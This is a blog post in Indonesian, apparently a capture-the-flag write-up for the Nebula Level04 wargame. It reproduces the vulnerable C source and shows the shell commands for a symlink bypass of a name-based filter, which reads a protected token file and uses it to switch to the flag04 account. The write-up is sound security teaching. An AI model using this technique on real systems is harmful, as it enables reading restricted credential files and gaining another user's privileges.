+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-17T03:57:03+00:00"
description = "Security Wargames"
featured = "wlRjyW6I_o.jpg"
featuredalt = "Nebula Level04"
featuredpath = "https://images2.imgbox.com/62/c7"
linktitle = ""
title = "Exploit Exercises - Nebula Level04"
type = "post"

+++
{{< url-link "Level04" "https://exploit-exercises.com/nebula/level03/" "target">}}  adalah salah satu tantangan favorit bagi saya dari keseluruhan seri yang ada.

Kita disajikan _source code_ untuk level4.c. Saya menyertakan kodenya di bawah ini untuk referensi lebih cepat:

    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>
    #include <fcntl.h>
    
    int main(int argc, char **argv, char **envp)
    {
        char buf[1024];
        int fd, rc;
    
        if(argc == 1) {
            printf("%s [file to read]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    
        if(strstr(argv[1], "token") != NULL) {
            printf("You may not access '%s'\n", argv[1]);
            exit(EXIT_FAILURE);
        }
    
        fd = open(argv[1], O_RDONLY);
        if(fd == -1) {
            err(EXIT_FAILURE, "Unable to open %s", argv[1]);
        }
    
        rc = read(fd, buf, sizeof(buf));
    
        if(rc == -1) {
            err(EXIT_FAILURE, "Unable to read fd %d", fd);
        }
    
        write(1, buf, rc);
    }

Sekilas saya melihat bahwa masalah ini rumit dan mulai mencari-cari _permission_ dari file, dan lain-lain. Setelah mencoba berkonsentrasi pada _source code_ yang disediakan, saya melihat adanya kesalahan pemrograman yang umum.

Pernyataan kedua jika secara eksplisit menyatakan file yang tidak ingin diakses oleh pemrogram. Karena kode pencocokannya berdasarkan nama kita harus bisa membuat _symbolic link_ untuk menampilkan isi token.

    level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04
    level04@nebula:/home/flag04$ ./flag04 /tmp/level04
    06508b5e-8909-4f38-b630-fdb148a848a2
    level04@nebula:/home/flag04$ id
    uid=1005(level04) gid=1005(level04) groups=1005(level04)
    level04@nebula:/home/flag04$ su flag04
    Password:
    sh-4.2$ id
    uid=995(flag04) gid=995(flag04) groups=995(flag04)
    sh-4.2$ getflag
    You have successfully executed getflag on a target account

Dan tadaaa, dengan menghindari filter berbasis nama, kita dapat membaca isi file yang dibatasi.

_Note: saya menggunakan isi token sebagai password untuk su ke akun flag04. Semoga ini membantu!_

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/K5nuQ5QGYKQ?rel=0"></iframe></div></div>